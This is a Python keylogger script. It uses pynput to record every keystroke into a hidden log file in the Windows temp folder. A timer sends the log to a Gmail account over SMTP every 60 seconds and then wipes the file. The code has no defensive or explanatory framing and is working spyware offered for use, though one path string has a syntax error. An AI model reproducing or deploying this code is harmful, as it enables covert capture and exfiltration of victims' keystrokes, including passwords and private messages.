
import smtplib
from pynput.keyboard import Key, Listener
import logging
import os
import threading

# Email Configuration
EMAIL_ADDRESS = "your_email@gmail.com"  # Replace with your email
EMAIL_PASSWORD = "your_password"        # Replace with your password
SEND_INTERVAL = 60  # Interval in seconds to send the email

# Log file path
log_dir = os.path.expanduser("~") + "\AppData\Local\Temp\"
log_file = log_dir + "keylog.txt"

logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Function to send email with the log file
def send_email():
    with open(log_file, "r") as file:
        data = file.read()
    if data:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, data)
        server.quit()
        with open(log_file, "w") as file:  # Clear log file after sending
            file.write("")
    threading.Timer(SEND_INTERVAL, send_email).start()

# Function to log keystrokes
def on_press(key):
    try:
        logging.info(str(key))
    except:
        pass

# Listener setup
with Listener(on_press=on_press) as listener:
    send_email()
    listener.join()
